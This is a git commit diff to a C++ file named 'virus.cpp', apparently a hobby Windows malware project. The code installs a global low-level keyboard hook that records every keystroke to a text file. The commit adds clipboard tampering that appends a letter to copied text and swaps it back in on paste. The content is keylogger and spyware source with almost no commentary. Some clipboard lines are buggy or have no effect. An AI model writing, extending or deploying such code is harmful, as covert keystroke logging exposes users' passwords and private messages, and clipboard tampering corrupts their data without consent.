9a159ed7a96ea4bca6be069d6af2d327bb76e0e2
Andy Simphaly <andytsimphaly@gmail.com>
2020-09-12 21:35:07 -0500

    Added copy and paste effect, where what is copied includes a random letter

--- virus.cpp
+++ virus.cpp
@@ -2,11 +2,27 @@
 #include <fstream>
 #include <windows.h>
 #include <winuser.h>
+#include <vector>
+
+const std::string WRITE_FILE = "output.txt";
+std::vector<char*> clipboardQueue;
 
 void WriteToFile(char inputChar)
 {
-  ofstream outputFile;
-  outputFile.open("")
+  std::ofstream outputFile;
+  outputFile.open(WRITE_FILE, std::fstream::app);
+
+  //make enter key (\r) output as a newline (\n)
+  if (inputChar == '\r')
+  {
+    inputChar = '\n';
+  }
+
+  std::cout << inputChar;
+  outputFile << inputChar;
+  outputFile.close();
+
+  return;
 }
 
 //The function that implements the key logging functionality
@@ -17,10 +33,38 @@ LRESULT CALLBACK LowLevelKeyboardProc( int nCode, WPARAM wParam, LPARAM lParam )
    KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
    switch( wParam )
    {
-       case WM_KEYUP: // When the key has been pressed and released
+       case WM_KEYDOWN: // When the key has been pressed and released
        {
           //get the key code
           pressedKey = (char)pKeyBoard->vkCode;
+          ///////////
+          if (pKeyBoard->vkCode == 0x43 && GetKeyState(VK_CONTROL) & 0x8000) {
+              WM_COPY;
+              Sleep(500);
+              OpenClipboard(NULL);
+              char* buffer;
+              buffer = (char*)GetClipboardData(CF_TEXT);
+              strcat (buffer, "v");
+              CloseClipboard();
+              clipboardQueue.push_back(buffer);
+              std::cout << buffer << " copied!\n";
+          }
+          else if (pKeyBoard->vkCode == 0x56 && GetKeyState(VK_CONTROL) & 0x8000) { // ctrl-v is pressed
+              if (clipboardQueue.size() > 0) {
+                  const char* output = clipboardQueue[0];
+                  const size_t len = strlen(output) + 1;
+                  HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, len);
+                  memcpy(GlobalLock(hMem), output, len);
+                  GlobalUnlock(hMem);
+                  OpenClipboard(0);
+                  EmptyClipboard();
+                  SetClipboardData(CF_TEXT, hMem);
+                  CloseClipboard();
+                  WM_PASTE;
+                  clipboardQueue.erase(clipboardQueue.begin());
+              }
+          }
+          ///////////
        }
        break;
        default:
@@ -39,6 +83,12 @@ int main()
 {
   //Retrieve the applications instance
   HINSTANCE instance = GetModuleHandle(NULL);
+
+  //Open clipboard
+  OpenClipboard(NULL);
+  EmptyClipboard();
+  CloseClipboard();
+
   //Set a global Windows Hook to capture keystrokes using the function declared above
   HHOOK test1 = SetWindowsHookEx( WH_KEYBOARD_LL, LowLevelKeyboardProc, instance, 0);
 
@@ -53,4 +103,3 @@ int main()
 
   return 0;
 }
-
